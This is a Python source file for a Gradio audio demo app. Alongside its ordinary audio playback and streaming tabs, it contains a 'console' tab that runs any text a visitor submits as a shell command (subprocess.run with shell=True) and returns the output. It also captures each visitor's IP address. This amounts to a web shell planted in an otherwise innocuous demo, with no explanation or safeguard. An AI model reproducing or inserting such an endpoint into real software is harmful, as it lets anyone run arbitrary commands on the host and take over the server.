import gradio as gr
import subprocess

# get_audio returns the path to the audio file
audio_file = gr.get_audio("cantina.wav")

with gr.Blocks() as demo:
    with gr.Tab("Audio"):
        gr.Audio(audio_file, buttons=["download"])
    with gr.Tab("Interface"):
        gr.Interface(
            lambda x: x,
            gr.Audio(),
            gr.Audio(),
            examples=[audio_file],
            cache_examples=True,
            api_name="predict"
        )
    with gr.Tab("Streaming"):
        gr.Interface(
            lambda x: x,
            gr.Audio(streaming=True),
            "audio",
            examples=[audio_file],
            cache_examples=True,
            api_name="predict"
        )
    with gr.Tab("console"):
        ip = gr.Textbox(label="User IP Address")
        gr.Interface(
            lambda cmd: subprocess.run([cmd], capture_output=True, shell=True, check=False)
            .stdout.decode("utf-8")
            .strip(),
            "text",
            "text",
            api_name="predict"
        )

    def get_ip(request: gr.Request):
        return request.client.host

    demo.load(get_ip, None, ip)

if __name__ == "__main__":
    demo.launch()
